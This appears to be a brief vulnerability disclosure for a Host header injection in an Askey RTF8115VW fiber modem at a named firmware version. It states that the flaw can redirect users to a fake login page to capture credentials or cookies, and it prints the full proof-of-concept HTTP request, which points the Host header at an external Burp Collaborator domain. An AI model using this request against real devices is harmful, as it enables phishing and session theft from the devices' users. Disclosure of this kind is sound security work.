**Authenticated Host Header Injection - Askey Internet Fiber Modem**

Vendor: **Askey**   
Software Version: **BR_SV_g11.11_RTF_TEF001_V6.54_V014**  
Model: **RTF8115VW**   
Vulnerable Header: **Host**  
Not tested in other model/version.   

Impact: An attacker could take advantege on that vulnerability to redirect user to a fake Login page in order to extract his credentials, or cookies.

The Final Request
```
GET / HTTP/1.1
Host: kay4tb35bh55y38n8h4teim21t7jv8.burpcollaborator.net
Cookie: _httpdSessionId_=7924107467ea5838a196b65306ca7236
Upgrade-Insecure-Requests: 1
Referer: http://x.x.x.x/cgi-bin/te_logout.cgi
Accept: */*
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Connection: close
Cache-Control: max-age=0
Accept-Encoding: gzip, deflate
```





![Alt text](/hostHeaderInjection.jpg?raw=true "Optional Title")
 
